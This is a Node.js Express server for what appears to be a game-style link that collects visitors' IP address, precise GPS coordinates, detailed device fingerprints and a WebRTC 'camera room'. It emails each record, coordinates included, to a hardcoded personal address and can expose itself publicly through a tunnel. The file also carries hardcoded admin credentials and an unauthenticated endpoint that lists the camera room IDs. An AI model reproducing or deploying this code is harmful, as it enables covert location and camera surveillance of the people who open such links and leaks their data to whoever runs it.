const path = require('path');
const fs = require('fs');
const express = require('express');
const cookieParser = require('cookie-parser');
const nodemailer = require('nodemailer');
const { WebSocketServer } = require('ws');

const app = express();
const PORT = process.env.PORT || 3000;
const ENABLE_TUNNEL = process.env.ENABLE_TUNNEL === '1';

// Simple Basic Auth for admin pages
const ADMIN_USER = process.env.ADMIN_USER || 'sailendra126';
const ADMIN_PASS = process.env.ADMIN_PASS || 'Nani@1904';
const SESSION_SECRET = process.env.SESSION_SECRET || 'dev-secret-change-me';
const COOKIE_NAME = 'sid';
const SESSION_MAX_AGE_DAYS = Number(process.env.SESSION_MAX_AGE_DAYS || 30);

function signSession(username, remember) {
  const data = { u: username, exp: Date.now() + (remember ? SESSION_MAX_AGE_DAYS : 1) * 24 * 60 * 60 * 1000 };
  const raw = Buffer.from(JSON.stringify(data)).toString('base64url');
  const sig = require('crypto').createHmac('sha256', SESSION_SECRET).update(raw).digest('base64url');
  return `${raw}.${sig}`;
}

function verifySession(token) {
  if (!token || typeof token !== 'string' || !token.includes('.')) return null;
  const [raw, sig] = token.split('.');
  const vsig = require('crypto').createHmac('sha256', SESSION_SECRET).update(raw).digest('base64url');
  if (vsig !== sig) return null;
  try {
    const data = JSON.parse(Buffer.from(raw, 'base64url').toString('utf8'));
    if (Date.now() > data.exp) return null;
    return data;
  } catch { return null; }
}

function requireSession(req, res, next) {
  const sid = req.cookies?.[COOKIE_NAME];
  const s = verifySession(sid);
  if (s && s.u === ADMIN_USER) return next();
  return res.status(401).send('Unauthorized');
}

function requireBasicAuth(req, res, next) {
  try {
    const header = req.headers['authorization'] || '';
    if (header.startsWith('Basic ')) {
      const decoded = Buffer.from(header.split(' ')[1], 'base64').toString('utf8');
      const idx = decoded.indexOf(':');
      const user = decoded.slice(0, idx);
      const pass = decoded.slice(idx + 1);
      if (user === ADMIN_USER && pass === ADMIN_PASS) {
        return next();
      }
    }
  } catch {}
  res.set('WWW-Authenticate', 'Basic realm="Admin", charset="UTF-8"');
  return res.status(401).send('Authentication required');
}

// Middleware
app.use(express.json({ limit: '100kb' }));
app.use(cookieParser());

// Encourage User-Agent Client Hints (device details) on supported browsers
app.use((req, res, next) => {
  res.setHeader('Accept-CH', [
    'Sec-CH-UA',
    'Sec-CH-UA-Full-Version-List',
    'Sec-CH-UA-Platform',
    'Sec-CH-UA-Platform-Version',
    'Sec-CH-UA-Arch',
    'Sec-CH-UA-Bitness',
    'Sec-CH-UA-Model'
  ].join(', '));
  res.setHeader('Permissions-Policy', [
    'ch-ua=(self)',
    'ch-ua-arch=(self)',
    'ch-ua-bitness=(self)',
    'ch-ua-full-version-list=(self)',
    'ch-ua-model=(self)',
    'ch-ua-platform=(self)',
    'ch-ua-platform-version=(self)'
  ].join(', '));
  next();
});

// Protect dashboard explicitly (redirect to login if not authenticated)
app.get('/dashboard.html', (req, res, next) => {
  const s = verifySession(req.cookies?.[COOKIE_NAME]);
  if (!s || s.u !== ADMIN_USER) {
    return res.redirect(302, '/login.html');
  }
  return res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// Serve static frontend
app.use(express.static(path.join(__dirname, 'public'), { index: 'index.html', extensions: ['html'] }));

// Ensure storage directory exists
const storageDir = path.join(__dirname, 'storage');
const storageFile = path.join(storageDir, 'data.jsonl');
fs.mkdirSync(storageDir, { recursive: true });

function getClientIp(req) {
  const xff = req.headers['x-forwarded-for'];
  if (typeof xff === 'string' && xff.length > 0) {
    return xff.split(',')[0].trim();
  }
  return req.socket?.remoteAddress || null;
}

// Retention: keep only last N days of data
const RETENTION_DAYS = Number(process.env.RETENTION_DAYS || 10);
function pruneOldRecords() {
  try {
    if (!fs.existsSync(storageFile)) return;
    const cutoffMs = Date.now() - RETENTION_DAYS * 24 * 60 * 60 * 1000;
    const lines = fs.readFileSync(storageFile, 'utf8').split('\n');
    const kept = [];
    for (const line of lines) {
      if (!line.trim()) continue;
      try {
        const rec = JSON.parse(line);
        const t = rec && rec.receivedAtIso ? Date.parse(rec.receivedAtIso) : NaN;
        if (!Number.isNaN(t) && t >= cutoffMs) kept.push(line);
      } catch {
        // keep malformed lines to avoid accidental data loss
        kept.push(line);
      }
    }
    fs.writeFileSync(storageFile, kept.join('\n').replace(/\n+$/,'') + '\n');
  } catch (e) {
    console.warn('pruneOldRecords failed:', e?.message || e);
  }
}

// in-memory recent dedupe ids (best-effort)
const recentIds = new Set();
function rememberId(id) {
  if (!id) return;
  recentIds.add(id);
  if (recentIds.size > 1000) {
    const first = recentIds.values().next().value; recentIds.delete(first);
  }
  setTimeout(() => recentIds.delete(id), 5 * 60 * 1000).unref?.();
}

app.post('/api/share', async (req, res) => {
  try {
    const userIp = getClientIp(req);
    const body = req.body || {};

    if (body.dedupeId && recentIds.has(body.dedupeId)) {
      return res.json({ status: 'ok', deduped: true });
    }

    const record = {
      receivedAtIso: new Date().toISOString(),
      ip: userIp,
      consent: body.consent || {},
      device: body.device || null,
      gps: body.gps || null,
      score: typeof body.score === 'number' ? body.score : null,
      playerName: typeof body.playerName === 'string' ? body.playerName : null,
      cameraRoom: typeof body.cameraRoom === 'string' ? body.cameraRoom : null,
      userAgent: req.headers['user-agent'] || null,
      acceptLanguage: req.headers['accept-language'] || null
    };

    // Persist as JSONL to keep it lightweight and append-only
    const line = JSON.stringify(record) + '\n';
    fs.appendFile(storageFile, line, (err) => {
      if (err) {
        console.error('Failed to write record:', err);
      }
    });

    // Notify via server logs (you can replace with email/webhook later)
    console.log('[New Share]', {
      ip: record.ip,
      device: record.device ? 'yes' : 'no',
      gps: record.gps ? 'yes' : 'no',
      score: record.score,
      consent: record.consent
    });

    // Email notification (best-effort)
    try {
      const to = process.env.NOTIFY_EMAIL || 'sailendra126@gmail.com';
      const transport = nodemailer.createTransport({
        host: process.env.SMTP_HOST || 'smtp.gmail.com',
        port: Number(process.env.SMTP_PORT || 587),
        secure: false,
        auth: process.env.SMTP_USER && process.env.SMTP_PASS ? { user: process.env.SMTP_USER, pass: process.env.SMTP_PASS } : undefined
      });
      const subject = `New share: ${record.ip || 'unknown'} ${record.gps ? `(${record.gps.latitude?.toFixed?.(6)},${record.gps.longitude?.toFixed?.(6)})` : ''}`;
      const text = JSON.stringify(record, null, 2);
      await transport.sendMail({ from: process.env.SMTP_FROM || to, to, subject, text });
    } catch (e) {
      console.warn('Email notify failed:', e?.message || e);
    }

    rememberId(body.dedupeId);
    res.json({ status: 'ok' });
  } catch (e) {
    console.error(e);
    res.status(500).json({ status: 'error' });
  }
});

// Admin: recent submissions (not authenticated; for demo use only)
app.get('/admin/recent', requireSession, (req, res) => {
  try {
    const limit = Math.max(1, Math.min(2000, Number(req.query.limit) || 50));
    const page = Number(req.query.page) || null; // 1-based
    const pageSize = Math.max(1, Math.min(1000, Number(req.query.pageSize) || 50));
    if (!fs.existsSync(storageFile)) {
      return page ? res.json({ total: 0, page: 1, pageSize, items: [] }) : res.json([]);
    }
    const data = fs.readFileSync(storageFile, 'utf8').trim().split('\n').filter(Boolean);
    const recordsNewestFirst = data.map((line) => {
      try { return JSON.parse(line); } catch { return { raw: line }; }
    }).reverse();

    if (page) {
      const total = recordsNewestFirst.length;
      const startIndex = (page - 1) * pageSize;
      const items = startIndex >= total ? [] : recordsNewestFirst.slice(startIndex, startIndex + pageSize);
      return res.json({ total, page, pageSize, items });
    }

    // Backwards-compatible non-paginated response using limit
    const recent = recordsNewestFirst.slice(0, limit);
    res.json(recent);
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: 'failed_to_read' });
  }
});

app.get('/admin/count', requireSession, (req, res) => {
  try {
    if (!fs.existsSync(storageFile)) return res.json({ total: 0 });
    const count = fs.readFileSync(storageFile, 'utf8').split('\n').filter(Boolean).length;
    res.json({ total: count });
  } catch (e) {
    res.status(500).json({ error: 'failed_to_count' });
  }
});

// Auth endpoints
app.post('/api/login', (req, res) => {
  const { username, password, remember } = req.body || {};
  if (username === ADMIN_USER && password === ADMIN_PASS) {
    const token = signSession(username, !!remember);
    const maxAge = (remember ? SESSION_MAX_AGE_DAYS : 1) * 24 * 60 * 60 * 1000;
    res.cookie(COOKIE_NAME, token, { httpOnly: true, sameSite: 'lax', maxAge });
    return res.json({ ok: true });
  }
  return res.status(401).json({ ok: false });
});

app.post('/api/logout', (req, res) => {
  res.clearCookie(COOKIE_NAME, { httpOnly: true, sameSite: 'lax' });
  res.json({ ok: true });
});

const httpServer = app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
  pruneOldRecords();
  // Prune once per day
  setInterval(pruneOldRecords, 24 * 60 * 60 * 1000).unref?.();
  if (ENABLE_TUNNEL) {
    (async () => {
      try {
        const mod = await import('localtunnel');
        const lt = mod.default || mod;
        const tunnel = await lt({ port: Number(PORT) });
        console.log('Public URL:', tunnel.url);
        tunnel.on('close', () => console.log('Tunnel closed'));
      } catch (e) {
        console.warn('localtunnel not available:', e?.message || e);
      }
    })();
  }
});

// --- WebSocket Signaling (rooms) ---
const wss = new WebSocketServer({ noServer: true });
const rooms = new Map(); // roomId -> Set(ws)

function broadcast(roomId, sender, data) {
  const set = rooms.get(roomId);
  if (!set) return;
  for (const ws of set) {
    if (ws !== sender && ws.readyState === ws.OPEN) {
      ws.send(JSON.stringify(data));
    }
  }
}

function handleWsConnection(ws, roomId) {
  console.log(`WebSocket connection established for room: ${roomId}`);
  if (!rooms.has(roomId)) rooms.set(roomId, new Set());
  rooms.get(roomId).add(ws);
  
  ws.on('message', (msg) => {
    try {
      const data = JSON.parse(msg.toString());
      console.log(`Received message in room ${roomId}:`, data.type || 'ICE candidate');
      // Relay SDP/ICE to others in the room
      broadcast(roomId, ws, data);
    } catch (error) {
      console.error('Error parsing WebSocket message:', error);
    }
  });
  
  ws.on('close', () => {
    console.log(`WebSocket connection closed for room: ${roomId}`);
    const set = rooms.get(roomId);
    if (set) { 
      set.delete(ws); 
      if (set.size === 0) {
        rooms.delete(roomId);
        console.log(`Room ${roomId} deleted (no more connections)`);
      }
    }
  });
  
  ws.on('error', (error) => {
    console.error(`WebSocket error in room ${roomId}:`, error);
  });
}

// Test endpoint to verify WebSocket server
app.get('/api/ws-status', (req, res) => {
  const roomCount = rooms.size;
  const totalConnections = Array.from(rooms.values()).reduce((sum, set) => sum + set.size, 0);
  res.json({ 
    rooms: roomCount, 
    connections: totalConnections,
    rooms: Array.from(rooms.keys())
  });
});

// Upgrade HTTP server to WS for /ws?room=ID on the same HTTP server
httpServer.on('upgrade', (req, socket, head) => {
  console.log(`WebSocket upgrade request: ${req.url}`);
  const url = new URL(req.url, 'http://localhost');
  if (url.pathname === '/ws') {
    const roomId = url.searchParams.get('room');
    console.log(`Upgrading to WebSocket for room: ${roomId}`);
    wss.handleUpgrade(req, socket, head, (ws) => handleWsConnection(ws, roomId || 'default'));
  } else {
    console.log(`Rejecting WebSocket upgrade for path: ${url.pathname}`);
    socket.destroy();
  }
});


